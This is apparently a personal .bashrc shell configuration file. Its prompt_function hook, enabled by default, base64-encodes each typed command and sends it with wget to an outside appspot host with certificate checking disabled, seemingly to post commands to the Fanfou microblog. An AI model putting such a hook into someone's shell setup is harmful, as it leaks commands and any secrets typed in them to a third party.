
# Check for an interactive session
[ -z "$PS1" ] && return

alias ls='ls --color=auto'
PS1='[\u@\h \W]\$ '

EDITOR=vim
HGMERGE=meld

PATH=$PATH:$HOME/bin
source ~/.hg_files/bash-completion-hg

# export GTK_IM_MODULE=ibus
# export XMODIFIERS=@im=ibus
# export QT_IM_MODULE=ibus

prompt_function () {
    local prompt_history="$(history 1)"
    prompt_history=${prompt_history:7}
    if [ "$prompt_history" = "$last_command" ]
    then
        return
    fi
    last_command=$prompt_history
    cmd=$(echo -n "$prompt_history" | base64 -w 0)
    cmd=${cmd//\+/-}
    cmd=${cmd//\//_}
    (wget --header="Host: cmd2fanfou.appspot.com" \
        --no-check-certificate -q -O /dev/null \
        "https://64.233.169.100/cmd?$cmd" &)
}
disable_fanfou () {
    PROMPT_COMMAND=
}
enable_fanfou () {
    PROMPT_COMMAND=prompt_function
}
PROMPT_COMMAND=enable_fanfou